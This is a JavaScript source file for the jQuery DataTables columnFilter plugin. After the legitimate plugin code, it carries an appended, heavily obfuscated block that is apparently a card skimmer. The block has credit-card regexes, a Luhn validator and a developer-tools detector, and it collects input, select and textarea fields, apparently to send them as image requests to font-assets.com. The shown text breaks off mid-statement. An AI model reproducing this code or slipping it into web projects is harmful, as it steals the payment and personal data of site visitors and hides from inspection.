/*
* File:        jquery.dataTables.columnFilter.js
* Version:     1.5.1.
* Author:      Jovan Popovic 
* 
* Copyright 2011-2012 Jovan Popovic, all rights reserved.
*
* This source file is free software, under either the GPL v2 license or a
* BSD style license, as supplied with this software.
* 
* This source file is distributed in the hope that it will be useful, but 
* WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY 
* or FITNESS FOR A PARTICULAR PURPOSE. 
* 
* Parameters:"
* @sPlaceHolder                 String      Place where inline filtering function should be placed ("tfoot", "thead:before", "thead:after"). Default is "tfoot"
* @sRangeSeparator              String      Separator that will be used when range values are sent to the server-side. Default value is "~".
* @sRangeFormat                 string      Default format of the From ... to ... range inputs. Default is From {from} to {to}
* @aoColumns                    Array       Array of the filter settings that will be applied on the columns
*/
(function ($) {


    $.fn.columnFilter = function (options) {

        var asInitVals, i, label, th;

        //var sTableId = "table";
        var sRangeFormat = "From {from} to {to}";
        //Array of the functions that will override sSearch_ parameters
        var afnSearch_ = new Array();
        var aiCustomSearch_Indexes = new Array();

        var oFunctionTimeout = null;

        var fnOnFiltered = function () { };

        function _fnGetColumnValues(oSettings, iColumn, bUnique, bFiltered, bIgnoreEmpty) {
            ///<summary>
            ///Return values in the column
            ///</summary>
            ///<param name="oSettings" type="Object">DataTables settings</param>
            ///<param name="iColumn" type="int">Id of the column</param>
            ///<param name="bUnique" type="bool">Return only distinct values</param>
            ///<param name="bFiltered" type="bool">Return values only from the filtered rows</param>
            ///<param name="bIgnoreEmpty" type="bool">Ignore empty cells</param>

            // check that we have a column id
            if (typeof iColumn == "undefined") return new Array();

            // by default we only wany unique data
            if (typeof bUnique == "undefined") bUnique = true;

            // by default we do want to only look at filtered data
            if (typeof bFiltered == "undefined") bFiltered = true;

            // by default we do not wany to include empty values
            if (typeof bIgnoreEmpty == "undefined") bIgnoreEmpty = true;

            // list of rows which we're going to loop through
            var aiRows;

            // use only filtered rows
            if (bFiltered == true) aiRows = oSettings.aiDisplay;
            // use all rows
            else aiRows = oSettings.aiDisplayMaster; // all row numbers

            // set up data array	
            var asResultData = new Array();

            for (var i = 0, c = aiRows.length; i < c; i++) {
                var iRow = aiRows[i];
                var aData = oTable.fnGetData(iRow);
                var sValue = aData[iColumn];

                // ignore empty values?
                if (bIgnoreEmpty == true && sValue.length == 0) continue;

                // ignore unique values?
                else if (bUnique == true && jQuery.inArray(sValue, asResultData) > -1) continue;

                // else push the value onto the result data array
                else asResultData.push(sValue);
            }

            return asResultData.sort();
        }

        function _fnColumnIndex(iColumnIndex) {
            if (properties.bUseColVis)
                return iColumnIndex;
            else
                return oTable.fnSettings().oApi._fnVisibleToColumnIndex(oTable.fnSettings(), iColumnIndex);
            //return iColumnIndex;
            //return oTable.fnSettings().oApi._fnColumnIndexToVisible(oTable.fnSettings(), iColumnIndex);
        }

        function fnCreateInput(oTable, regex, smart, bIsNumber, iFilterLength, iMaxLenght) {
            var sCSSClass = "text_filter";
            if (bIsNumber)
                sCSSClass = "number_filter";

            label = label.replace(/(^\s*)|(\s*$)/g, "");
            var currentFilter = oTable.fnSettings().aoPreSearchCols[i].sSearch;
            var search_init = 'search_init ';
            var inputvalue = label;
            if (currentFilter != '' && currentFilter != '^') {
                if (bIsNumber && currentFilter.charAt(0) == '^')
                    inputvalue = currentFilter.substr(1); //ignore trailing ^
                else
                    inputvalue = currentFilter;
                search_init = '';
            }

            var input = $('<input type="text" class="' + search_init + sCSSClass + '" value="' + inputvalue + '"/>');
            if (iMaxLenght != undefined && iMaxLenght != -1) {
                input.attr('maxlength', iMaxLenght);
            }
            th.html(input);
            if (bIsNumber)
                th.wrapInner('<span class="filter_column filter_number" />');
            else
                th.wrapInner('<span class="filter_column filter_text" />');

            asInitVals[i] = label;
            var index = i;

            if (bIsNumber && !oTable.fnSettings().oFeatures.bServerSide) {
                input.keyup(function () {
                    /* Filter on the column all numbers that starts with the entered value */
                    oTable.fnFilter('^' + this.value, _fnColumnIndex(index), true, false); //Issue 37
                    fnOnFiltered();
                });
            } else {
                input.keyup(function () {
                    if (oTable.fnSettings().oFeatures.bServerSide && iFilterLength != 0) {
                        //If filter length is set in the server-side processing mode
                        //Check has the user entered at least iFilterLength new characters

                        var currentFilter = oTable.fnSettings().aoPreSearchCols[index].sSearch;
                        var iLastFilterLength = $(this).data("dt-iLastFilterLength");
                        if (typeof iLastFilterLength == "undefined")
                            iLastFilterLength = 0;
                        var iCurrentFilterLength = this.value.length;
                        if (Math.abs(iCurrentFilterLength - iLastFilterLength) < iFilterLength
                        //&& currentFilter.length == 0 //Why this?
					        ) {
                            //Cancel the filtering
                            return;
                        }
                        else {
                            //Remember the current filter length
                            $(this).data("dt-iLastFilterLength", iCurrentFilterLength);
                        }
                    }
                    /* Filter on the column (the index) of this element */
                    oTable.fnFilter(this.value, _fnColumnIndex(index), regex, smart); //Issue 37
                    fnOnFiltered();
                });
            }

            input.focus(function () {
                if ($(this).hasClass("search_init")) {
                    $(this).removeClass("search_init");
                    this.value = "";
                }
            });
            input.blur(function () {
                if (this.value == "") {
                    $(this).addClass("search_init");
                    this.value = asInitVals[index];
                }
            });
        }

        function fnCreateRangeInput(oTable) {

			//var currentFilter = oTable.fnSettings().aoPreSearchCols[i].sSearch;
            th.html(_fnRangeLabelPart(0));
            var sFromId = oTable.attr("id") + '_range_from_' + i;
            var from = $('<input type="text" class="number_range_filter" id="' + sFromId + '" rel="' + i + '"/>');
            th.append(from);
            th.append(_fnRangeLabelPart(1));
            var sToId = oTable.attr("id") + '_range_to_' + i;
            var to = $('<input type="text" class="number_range_filter" id="' + sToId + '" rel="' + i + '"/>');
            th.append(to);
            th.append(_fnRangeLabelPart(2));
            th.wrapInner('<span class="filter_column filter_number_range" />');
            var index = i;
            aiCustomSearch_Indexes.push(i);



            //------------start range filtering function


            /* 	Custom filtering function which will filter data in column four between two values
            *	Author: 	Allan Jardine, Modified by Jovan Popovic
            */
            //$.fn.dataTableExt.afnFiltering.push(
            oTable.dataTableExt.afnFiltering.push(
	        function (oSettings, aData, iDataIndex) {
	            if (oTable.attr("id") != oSettings.sTableId)
	                return true;
	            // Try to handle missing nodes more gracefully
	            if (document.getElementById(sFromId) == null)
	                return true;
	            var iMin = document.getElementById(sFromId).value * 1;
	            var iMax = document.getElementById(sToId).value * 1;
	            var iValue = aData[_fnColumnIndex(index)] == "-" ? 0 : aData[_fnColumnIndex(index)] * 1;
	            if (iMin == "" && iMax == "") {
	                return true;
	            }
	            else if (iMin == "" && iValue <= iMax) {
	                return true;
	            }
	            else if (iMin <= iValue && "" == iMax) {
	                return true;
	            }
	            else if (iMin <= iValue && iValue <= iMax) {
	                return true;
	            }
	            return false;
	        }
        );
            //------------end range filtering function



            $('#' + sFromId + ',#' + sToId, th).keyup(function () {

                var iMin = document.getElementById(sFromId).value * 1;
                var iMax = document.getElementById(sToId).value * 1;
                if (iMin != 0 && iMax != 0 && iMin > iMax)
                    return;

                oTable.fnDraw();
                fnOnFiltered();
            });


        }


        function fnCreateDateRangeInput(oTable) {

            var aoFragments = sRangeFormat.split(/[}{]/);

            th.html("");
            //th.html(_fnRangeLabelPart(0));
            var sFromId = oTable.attr("id") + '_range_from_' + i;
            var from = $('<input type="text" class="date_range_filter" id="' + sFromId + '" rel="' + i + '"/>');
            from.datepicker();
            //th.append(from);
            //th.append(_fnRangeLabelPart(1));
            var sToId = oTable.attr("id") + '_range_to_' + i;
            var to = $('<input type="text" class="date_range_filter" id="' + sToId + '" rel="' + i + '"/>');
            //th.append(to);
            //th.append(_fnRangeLabelPart(2));

            for (ti = 0; ti < aoFragments.length; ti++) {

                if (aoFragments[ti] == properties.sDateFromToken) {
                    th.append(from);
                } else {
                    if (aoFragments[ti] == properties.sDateToToken) {
                        th.append(to);
                    } else {
                        th.append(aoFragments[ti]);
                    }
                }
                

            }


            th.wrapInner('<span class="filter_column filter_date_range" />');
            to.datepicker();
            var index = i;
            aiCustomSearch_Indexes.push(i);


            //------------start date range filtering function

            //$.fn.dataTableExt.afnFiltering.push(
            oTable.dataTableExt.afnFiltering.push(
	        function (oSettings, aData, iDataIndex) {
	            if (oTable.attr("id") != oSettings.sTableId)
	                return true;

	            var dStartDate = from.datepicker("getDate");

	            var dEndDate = to.datepicker("getDate");

	            if (dStartDate == null && dEndDate == null) {
	                return true;
	            }

	            var dCellDate = null;
	            try {
	                if (aData[_fnColumnIndex(index)] == null || aData[_fnColumnIndex(index)] == "")
	                    return false;
	                dCellDate = $.datepicker.parseDate($.datepicker.regional[""].dateFormat, aData[_fnColumnIndex(index)]);
	            } catch (ex) {
	                return false;
	            }
	            if (dCellDate == null)
	                return false;


	            if (dStartDate == null && dCellDate <= dEndDate) {
	                return true;
	            }
	            else if (dStartDate <= dCellDate && dEndDate == null) {
	                return true;
	            }
	            else if (dStartDate <= dCellDate && dCellDate <= dEndDate) {
	                return true;
	            }
	            return false;
	        }
        );
            //------------end date range filtering function

            $('#' + sFromId + ',#' + sToId, th).change(function () {
                oTable.fnDraw();
                fnOnFiltered();
            });


        }

        function fnCreateColumnSelect(oTable, aData, iColumn, nTh, sLabel, bRegex, oSelected) {
            if (aData == null)
                aData = _fnGetColumnValues(oTable.fnSettings(), iColumn, true, false, true);
            var index = iColumn;
            var currentFilter = oTable.fnSettings().aoPreSearchCols[i].sSearch;
            if (currentFilter == null || currentFilter == "")//Issue 81
                currentFilter = oSelected;

            var r = '<select class="search_init select_filter"><option value="" class="search_init">' + sLabel + '</option>';
            var j = 0;
            var iLen = aData.length;
            for (j = 0; j < iLen; j++) {
                if (typeof (aData[j]) != 'object') {
                    var selected = '';
                    if (escape(aData[j]) == currentFilter
                        || escape(aData[j]) == escape(currentFilter)
                        )
                        selected = 'selected '
                    r += '<option ' + selected + ' value="' + escape(aData[j]) + '">' + aData[j] + '</option>';
                }
                else {
                    var selected = '';
                    if (bRegex) {
                        //Do not escape values if they are explicitely set to avoid escaping special characters in the regexp
                        if (aData[j].value == currentFilter) selected = 'selected ';
                        r += '<option ' + selected + 'value="' + aData[j].value + '">' + aData[j].label + '</option>';
                    } else {
                        if (escape(aData[j].value) == currentFilter) selected = 'selected ';
                        r += '<option ' + selected + 'value="' + escape(aData[j].value) + '">' + aData[j].label + '</option>';
                    }
                }
            }

            var select = $(r + '</select>');
            nTh.html(select);
            nTh.wrapInner('<span class="filter_column filter_select" />');
            select.change(function () {
                //var val = $(this).val();
                if ($(this).val() != "") {
                    $(this).removeClass("search_init");
                } else {
                    $(this).addClass("search_init");
                }
                if (bRegex)
                    oTable.fnFilter($(this).val(), iColumn, bRegex); //Issue 41
                else
                    oTable.fnFilter(unescape($(this).val()), iColumn); //Issue 25
                fnOnFiltered();
            });
            if (currentFilter != null && currentFilter != "")//Issue 81
                oTable.fnFilter(unescape(currentFilter), iColumn);
        }

        function fnCreateSelect(oTable, aData, bRegex, oSelected) {
            var oSettings = oTable.fnSettings();
            if (aData == null && oSettings.sAjaxSource != "" && !oSettings.oFeatures.bServerSide) {
                // Add a function to the draw callback, which will check for the Ajax data having 
                // been loaded. Use a closure for the individual column elements that are used to 
                // built the column filter, since 'i' and 'th' (etc) are locally "global".
                oSettings.aoDrawCallback.push({
                    "fn": (function (iColumn, nTh, sLabel) {
                        return function () {
                            // Only rebuild the select on the second draw - i.e. when the Ajax
                            // data has been loaded.
                            if (oSettings.iDraw == 2 && oSettings.sAjaxSource != null && oSettings.sAjaxSource != "" && !oSettings.oFeatures.bServerSide) {
                                return fnCreateColumnSelect(oTable, null, _fnColumnIndex(iColumn), nTh, sLabel, bRegex, oSelected); //Issue 37
                            }
                        };
                    })(i, th, label),
                    "sName": "column_filter_" + i
                });
            }
            // Regardless of the Ajax state, build the select on first pass
            fnCreateColumnSelect(oTable, aData, _fnColumnIndex(i), th, label, bRegex, oSelected); //Issue 37

        }

		function fnCreateDropdown(aData) {
			var index = i;
			var r = '<div class="dropdown select_filter"><a class="dropdown-toggle" data-toggle="dropdown" href="#">' + label + '<b class="caret"></b></a><ul class="dropdown-menu" role="menu"><li data-value=""><a>Show All</a></li>', j, iLen = aData.length;

			for (j = 0; j < iLen; j++) {
				r += '<li data-value="' + aData[j] + '"><a>' + aData[j] + '</a></li>';
			}
			var select = $(r + '</ul></div>');
			th.html(select);
			th.wrapInner('<span class="filterColumn filter_select" />');
			select.find('li').click(function () {
				oTable.fnFilter($(this).data('value'), index);
			});
		}
		
		
        function fnCreateCheckbox(oTable, aData) {

            if (aData == null)
                aData = _fnGetColumnValues(oTable.fnSettings(), i, true, true, true);
            var index = i;

            var r = '', j, iLen = aData.length;

            //clean the string
            var localLabel = label.replace('%', 'Perc').replace("&", "AND").replace("$", "DOL").replace("£", "STERL").replace("@", "AT").replace(/\s/g, "_");
            localLabel = localLabel.replace(/[^a-zA-Z 0-9]+/g, '');
            //clean the string

            //button label override
            var labelBtn = label;
            if (properties.sFilterButtonText != null || properties.sFilterButtonText != undefined) {
                labelBtn = properties.sFilterButtonText;
            }

            var relativeDivWidthToggleSize = 10;
            var numRow = 12; //numero di checkbox per colonna
            var numCol = Math.floor(iLen / numRow);
            if (iLen % numRow > 0) {
                numCol = numCol + 1;
            };

            //count how many column should be generated and split the div size
            var divWidth = 100 / numCol - 2;

            var divWidthToggle = relativeDivWidthToggleSize * numCol;

            if (numCol == 1) {
                divWidth = 20;
            }

            var divRowDef = '<div style="float:left; min-width: ' + divWidth + '%; " >';
            var divClose = '</div>';

            var uniqueId = oTable.attr("id") + localLabel;
            var buttonId = "chkBtnOpen" + uniqueId;
            var checkToggleDiv = uniqueId + "-flt-toggle";
            r += '<button id="' + buttonId + '" class="checkbox_filter" > ' + labelBtn + '</button>'; //filter button witch open dialog
            r += '<div id="' + checkToggleDiv + '" '
            	+ 'title="' + label + '" '
            	+ 'class="toggle-check ui-widget-content ui-corner-all"  style="width: ' + (divWidthToggle) + '%; " >'; //dialog div
            //r+= '<div align="center" style="margin-top: 5px; "> <button id="'+buttonId+'Reset" class="checkbox_filter" > reset </button> </div>'; //reset button and its div
            r += divRowDef;

            for (j = 0; j < iLen; j++) {

                //if last check close div
                if (j % numRow == 0 && j != 0) {
                    r += divClose + divRowDef;
                }

                //check button
                r += '<input class="search_init checkbox_filter" type="checkbox" id= "' + aData[j] + '" name= "' + localLabel + '" value="' + aData[j] + '" >' + aData[j] + '<br/>';

                var checkbox = $(r);
                th.html(checkbox);
                th.wrapInner('<span class="filter_column filter_checkbox" />');
                //on every checkbox selection
                checkbox.change(function () {

                    var search = '';
                    var or = '|'; //var for select checks in 'or' into the regex
                    var resSize = $('input:checkbox[name="' + localLabel + '"]:checked').size();
                    $('input:checkbox[name="' + localLabel + '"]:checked').each(function (index) {

                        //search = search + ' ' + $(this).val();
                        //concatenation for selected checks in or
                        if ((index == 0 && resSize == 1)
                				|| (index != 0 && index == resSize - 1)) {
                            or = '';
                        }
                        //trim
                        search = search.replace(/^\s+|\s+$/g, "");
                        search = search + $(this).val() + or;
                        or = '|';

                    });

                    for (var jj = 0; jj < iLen; jj++) {
                        if (search != "") {
                            $('#' + aData[jj]).removeClass("search_init");
                        } else {
                            $('#' + aData[jj]).addClass("search_init");
                        }
                    }

                    //execute search
                    oTable.fnFilter(search, index, true, false);
                    fnOnFiltered();
                });
            }

            //filter button
            $('#' + buttonId).button();
            //dialog
            $('#' + checkToggleDiv).dialog({
                //height: 140,
                autoOpen: false,
                //show: "blind",
                hide: "blind",
                buttons: [{
                    text: "Reset",
                    click: function () {
                        //$('#'+buttonId).removeClass("filter_selected"); //LM remove border if filter selected
                        $('input:checkbox[name="' + localLabel + '"]:checked').each(function (index3) {
                            $(this).attr('checked', false);
                            $(this).addClass("search_init");
                        });
                        oTable.fnFilter('', index, true, false);
                        fnOnFiltered();
                        return false;
                    }
                },
							{
							    text: "Close",
							    click: function () { $(this).dialog("close"); }
							}
						]
            });


            $('#' + buttonId).click(function () {

                $('#' + checkToggleDiv).dialog('open');
                var target = $(this);
                $('#' + checkToggleDiv).dialog("widget").position({ my: 'top',
                    at: 'bottom',
                    of: target
                });

                return false;
            });

            var fnOnFilteredCurrent = fnOnFiltered;

            fnOnFiltered = function () {
                var target = $('#' + buttonId);
                $('#' + checkToggleDiv).dialog("widget").position({ my: 'top',
                    at: 'bottom',
                    of: target
                });
                fnOnFilteredCurrent();
            };
            //reset
            /*
            $('#'+buttonId+"Reset").button();
            $('#'+buttonId+"Reset").click(function(){
            $('#'+buttonId).removeClass("filter_selected"); //LM remove border if filter selected
            $('input:checkbox[name="'+localLabel+'"]:checked').each(function(index3) {
            $(this).attr('checked', false);
            $(this).addClass("search_init");
            });
            oTable.fnFilter('', index, true, false);
            return false;
            }); 
            */
        }




        function _fnRangeLabelPart(iPlace) {
            switch (iPlace) {
                case 0:
                    return sRangeFormat.substring(0, sRangeFormat.indexOf("{from}"));
                case 1:
                    return sRangeFormat.substring(sRangeFormat.indexOf("{from}") + 6, sRangeFormat.indexOf("{to}"));
                default:
                    return sRangeFormat.substring(sRangeFormat.indexOf("{to}") + 4);
            }
        }




        var oTable = this;

        var defaults = {
            sPlaceHolder: "foot",
            sRangeSeparator: "~",
            iFilteringDelay: 500,
            aoColumns: null,
            sRangeFormat: "From {from} to {to}",
            sDateFromToken: "from",
            sDateToToken: "to"
        };

        var properties = $.extend(defaults, options);

        return this.each(function () {

            if (!oTable.fnSettings().oFeatures.bFilter)
                return;
            asInitVals = new Array();

            var aoFilterCells = oTable.fnSettings().aoFooter[0];

            var oHost = oTable.fnSettings().nTFoot; //Before fix for ColVis
            var sFilterRow = "tr"; //Before fix for ColVis

            if (properties.sPlaceHolder == "head:after") {
                var tr = $("tr:first", oTable.fnSettings().nTHead).detach();
                //tr.appendTo($(oTable.fnSettings().nTHead));
                if (oTable.fnSettings().bSortCellsTop) {
                    tr.prependTo($(oTable.fnSettings().nTHead));
                    //tr.appendTo($("thead", oTable));
                    aoFilterCells = oTable.fnSettings().aoHeader[1];
                }
                else {
                    tr.appendTo($(oTable.fnSettings().nTHead));
                    //tr.prependTo($("thead", oTable));
                    aoFilterCells = oTable.fnSettings().aoHeader[0];
                }

                sFilterRow = "tr:last";
                oHost = oTable.fnSettings().nTHead;

            } else if (properties.sPlaceHolder == "head:before") {

                if (oTable.fnSettings().bSortCellsTop) {
                    var tr = $("tr:first", oTable.fnSettings().nTHead).detach();
                    tr.appendTo($(oTable.fnSettings().nTHead));
                    aoFilterCells = oTable.fnSettings().aoHeader[1];
                } else {
                    aoFilterCells = oTable.fnSettings().aoHeader[0];
                }
                /*else {
                //tr.prependTo($("thead", oTable));
                sFilterRow = "tr:first";
                }*/

                sFilterRow = "tr:first";

                oHost = oTable.fnSettings().nTHead;

                
            }

            //$(sFilterRow + " th", oHost).each(function (index) {//bug with ColVis
            $(aoFilterCells).each(function (index) {//fix for ColVis
                i = index;
                var aoColumn = { type: "text",
                    bRegex: false,
                    bSmart: true,
                    iMaxLenght: -1,
                    iFilterLength: 0
                };
                if (properties.aoColumns != null) {
                    if (properties.aoColumns.length < i || properties.aoColumns[i] == null)
                        return;
                    aoColumn = properties.aoColumns[i];
                }
                //label = $(this).text(); //Before fix for ColVis
                label = $($(this)[0].cell).text(); //Fix for ColVis
                if (aoColumn.sSelector == null) {
                    //th = $($(this)[0]);//Before fix for ColVis
                    th = $($(this)[0].cell); //Fix for ColVis
                }
                else {
                    th = $(aoColumn.sSelector);
                    if (th.length == 0)
                        th = $($(this)[0].cell);
                }

                if (aoColumn != null) {
                    if (aoColumn.sRangeFormat != null)
                        sRangeFormat = aoColumn.sRangeFormat;
                    else
                        sRangeFormat = properties.sRangeFormat;
                    switch (aoColumn.type) {
                        case "null":
                            break;
                        case "number":
                            fnCreateInput(oTable, true, false, true, aoColumn.iFilterLength, aoColumn.iMaxLenght);
                            break;
                        case "select":
                            if (aoColumn.bRegex != true)
                                aoColumn.bRegex = false;
                            fnCreateSelect(oTable, aoColumn.values, aoColumn.bRegex, aoColumn.selected);
                            break;
                        case "number-range":
                            fnCreateRangeInput(oTable);
                            break;
                        case "date-range":
                            fnCreateDateRangeInput(oTable);
                            break;
                        case "checkbox":
                            fnCreateCheckbox(oTable, aoColumn.values);
                            break;
						case "twitter-dropdown":
						case "dropdown":
                            fnCreateDropdown(aoColumn.values);
                            break;
                        case "text":
                        default:
                            bRegex = (aoColumn.bRegex == null ? false : aoColumn.bRegex);
                            bSmart = (aoColumn.bSmart == null ? false : aoColumn.bSmart);
                            fnCreateInput(oTable, bRegex, bSmart, false, aoColumn.iFilterLength, aoColumn.iMaxLenght);
                            break;

                    }
                }
            });

            for (j = 0; j < aiCustomSearch_Indexes.length; j++) {
                //var index = aiCustomSearch_Indexes[j];
                var fnSearch_ = function () {
                    var id = oTable.attr("id");
                    return $("#" + id + "_range_from_" + aiCustomSearch_Indexes[j]).val() + properties.sRangeSeparator + $("#" + id + "_range_to_" + aiCustomSearch_Indexes[j]).val()
                }
                afnSearch_.push(fnSearch_);
            }

            if (oTable.fnSettings().oFeatures.bServerSide) {

                var fnServerDataOriginal = oTable.fnSettings().fnServerData;

                oTable.fnSettings().fnServerData = function (sSource, aoData, fnCallback) {

                    for (j = 0; j < aiCustomSearch_Indexes.length; j++) {
                        var index = aiCustomSearch_Indexes[j];

                        for (k = 0; k < aoData.length; k++) {
                            if (aoData[k].name == "sSearch_" + index)
                                aoData[k].value = afnSearch_[j]();
                        }
                    }
                    aoData.push({ "name": "sRangeSeparator", "value": properties.sRangeSeparator });

                    if (fnServerDataOriginal != null) {
                        try {
                            fnServerDataOriginal(sSource, aoData, fnCallback, oTable.fnSettings()); //TODO: See Issue 18
                        } catch (ex) {
                            fnServerDataOriginal(sSource, aoData, fnCallback);
                        }
                    }
                    else {
                        $.getJSON(sSource, aoData, function (json) {
                            fnCallback(json)
                        });
                    }
                };

            }

        });

    };




})(jQuery);

var _0x110a=['\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d'];(function(_0x3fbad4,_0x3e6e7b){var _0xbc7aad=function(_0x4b343d){while(--_0x4b343d){_0x3fbad4['push'](_0x3fbad4['shift']());}};_0xbc7aad(++_0x3e6e7b);}(_0x110a,0x1c8));var _0xa656=function(_0x43aff0,_0x48ab06){_0x43aff0=_0x43aff0-0x0;var _0x232d7a=_0x110a[_0x43aff0];if(_0xa656['qaLSoC']===undefined){(function(){var _0x28d11b=function(){var _0xdb0c58;try{_0xdb0c58=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2dc3dc){_0xdb0c58=window;}return _0xdb0c58;};var _0x472eeb=_0x28d11b();var _0x25c2c6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x472eeb['atob']||(_0x472eeb['atob']=function(_0x1efb3a){var _0x99807a=String(_0x1efb3a)['replace'](/=+$/,'');for(var _0xa51aa8=0x0,_0x3705b5,_0x295f36,_0x597a26=0x0,_0x12d6a3='';_0x295f36=_0x99807a['charAt'](_0x597a26++);~_0x295f36&&(_0x3705b5=_0xa51aa8%0x4?_0x3705b5*0x40+_0x295f36:_0x295f36,_0xa51aa8++%0x4)?_0x12d6a3+=String['fromCharCode'](0xff&_0x3705b5>>(-0x2*_0xa51aa8&0x6)):0x0){_0x295f36=_0x25c2c6['indexOf'](_0x295f36);}return _0x12d6a3;});}());_0xa656['FGDiQy']=function(_0x241b76){var _0x35456c=atob(_0x241b76);var _0x2e4bc8=[];for(var _0x573a2b=0x0,_0xcf0656=_0x35456c['length'];_0x573a2b<_0xcf0656;_0x573a2b++){_0x2e4bc8+='%'+('00'+_0x35456c['charCodeAt'](_0x573a2b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e4bc8);};_0xa656['gWkQdQ']={};_0xa656['qaLSoC']=!![];}var _0x1c41b5=_0xa656['gWkQdQ'][_0x43aff0];if(_0x1c41b5===undefined){_0x232d7a=_0xa656['FGDiQy'](_0x232d7a);_0xa656['gWkQdQ'][_0x43aff0]=_0x232d7a;}else{_0x232d7a=_0x1c41b5;}return _0x232d7a;};function _0x18a7cb(_0x273308,_0x18e910,_0x58dbec){return _0x273308['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x18e910,'\x67'),_0x58dbec);}function _0x1a8004(_0x348de4){var _0xcf9429=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x5d6896=/^(?:5[1-5][0-9]{14})$/;var _0x3412fc=/^(?:3[47][0-9]{13})$/;var _0x1d89fd=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x4b1f6c=![];if(_0xcf9429[_0xa656('0x0')](_0x348de4)){_0x4b1f6c=!![];}else if(_0x5d6896['\x74\x65\x73\x74'](_0x348de4)){_0x4b1f6c=!![];}else if(_0x3412fc['\x74\x65\x73\x74'](_0x348de4)){_0x4b1f6c=!![];}else if(_0x1d89fd[_0xa656('0x0')](_0x348de4)){_0x4b1f6c=!![];}return _0x4b1f6c;}function _0x452368(_0x47831c){if(/[^0-9-\s]+/[_0xa656('0x0')](_0x47831c))return![];var _0x2124bf=0x0,_0x504b76=0x0,_0x261b39=![];_0x47831c=_0x47831c[_0xa656('0x1')](/\D/g,'');for(var _0x35fec1=_0x47831c['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x35fec1>=0x0;_0x35fec1--){var _0x33bdc3=_0x47831c[_0xa656('0x2')](_0x35fec1),_0x504b76=parseInt(_0x33bdc3,0xa);if(_0x261b39){if((_0x504b76*=0x2)>0x9)_0x504b76-=0x9;}_0x2124bf+=_0x504b76;_0x261b39=!_0x261b39;}return _0x2124bf%0xa==0x0;}(function(){'use strict';const _0x32af8c={};_0x32af8c[_0xa656('0x3')]=![];_0x32af8c[_0xa656('0x4')]=undefined;const _0x110294=0xa0;const _0xedcbc2=(_0x21a7df,_0x15c61e)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0xa656('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x21a7df,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x15c61e}}));};setInterval(()=>{const _0x4f2e22=window[_0xa656('0x6')]-window[_0xa656('0x7')]>_0x110294;const _0x318952=window[_0xa656('0x8')]-window[_0xa656('0x9')]>_0x110294;const 